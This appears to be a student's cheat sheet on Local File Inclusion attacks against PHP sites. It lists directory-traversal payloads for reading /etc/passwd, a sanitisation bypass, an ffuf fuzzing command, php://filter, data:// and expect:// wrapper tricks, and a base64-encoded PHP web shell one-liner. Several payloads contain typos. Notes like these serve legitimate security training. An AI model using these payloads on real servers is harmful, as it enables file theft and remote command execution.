# What is LFI(Local file Inclusion)?
- It is exploiting the website with vulnerabilites such as sites with visible '=', backend servers open users and cookies are visible using the url or tools such as curl, ffuf and python3.

  ## Common exploits:
  - Using different php files might expose them this is vulnerable.
  - We can use `=/etc/passwd`
  - `=../../../../` to jump to root directory
  - `=..../..../..../` to bypass sanitiztion of ../
  - by encoding our lfi into url form using burp-suite
  - using ffaf to serach for php files to use php wrappers with filter-> `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ.php` and `=php://filter/conver.base64-encode/resource=<file u wanna read>` and u get the base64 output if php is vulnerable.
  - We can also convert our php get request into a base64 code and use it in the data wrapper.`echo '<?php system($_GET["cmd"]); ?> |base64`--> `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<your_php_in_base64_encoded_to_url>&cmd=pwd`
  - Another was is using input php wrapper and except php wrapper `http://<SERVER_IP>:<PORT>/index.php?language=expect://id` although we will need to encode 'expect://id' into url.
  - 
